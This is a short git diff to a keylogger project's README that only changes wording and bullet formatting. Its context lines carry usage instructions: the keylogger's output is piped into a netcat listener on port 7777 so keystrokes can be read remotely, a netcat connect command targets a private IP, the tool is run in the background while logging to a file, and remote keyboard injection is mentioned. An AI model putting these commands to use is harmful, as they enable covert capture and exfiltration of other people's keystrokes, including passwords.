@@ -28,7 +28,7 @@ python simple_keylogger.py
       ```
       python3 kl.py | nc -lkv 7777
       ```
-      * or
+      or
       ```
       python -m keyboard | nc -lkv 7777
       ```
@@ -36,7 +36,7 @@ python simple_keylogger.py
       ```  
       nc -zv 10.2.0.5 7777
       ```
-      * or, use firefox.
+      or, use a browser.
   * Run in background using '&' and pipe output to file.
 * Remote keyboard injection (possible with keyboard module)
 
